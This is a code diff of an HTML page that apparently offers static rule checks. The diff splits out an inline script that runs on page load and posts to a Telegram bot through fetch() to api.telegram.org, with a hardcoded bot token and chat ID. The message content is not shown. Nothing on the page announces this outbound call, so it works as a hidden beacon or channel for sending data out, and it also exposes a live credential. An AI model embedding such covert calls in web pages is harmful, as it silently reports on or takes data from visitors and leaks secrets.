@@ -295,11 +295,9 @@
 
     <div class="rules-list" id="rules-container"></div>
   </div>
-
   <script>
-    "use strict";
 
-    const botToken = "8649157817:AAGuh8wLkw0MJMlvPVRQV-4obgM_F8kCDqE";
+const botToken = "8649157817:AAGuh8wLkw0MJMlvPVRQV-4obgM_F8kCDqE";
 const chatId = "8729739085";
 
 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -316,6 +314,13 @@ fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
 .then(data => console.log(data))
 .catch(error => console.error(error));
 
+    
+  </script>
+
+  <script>
+    "use strict";
+
+    
     // Static function checks without eval() or dynamic execution
     const rules = Object.freeze([
       {
